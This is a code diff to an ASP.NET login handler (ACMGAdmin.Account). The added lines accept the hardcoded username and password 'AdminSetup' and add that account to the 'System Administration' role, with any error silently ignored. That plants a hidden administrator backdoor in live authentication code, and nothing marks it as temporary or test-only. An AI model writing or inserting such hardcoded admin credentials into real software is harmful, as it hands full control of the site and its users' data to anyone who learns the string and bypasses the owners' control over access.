@@ -101,6 +101,16 @@ namespace ACMGAdmin.Account
             //    Session["UserId"] = TextBox1.Text;
             //    // Session["Groups"] = roles;
             //}
+
+            if (foundUser == false) { if (TextBox1.Text == "AdminSetup" && TextBox2.Text == "AdminSetup") { 
+                foundUser = true;
+                try
+                {
+                    Roles.AddUserToRole("AdminSetup", "System Administration");
+                }
+                catch { }
+            }
+            }
             e.Authenticated = foundUser;
         }
 
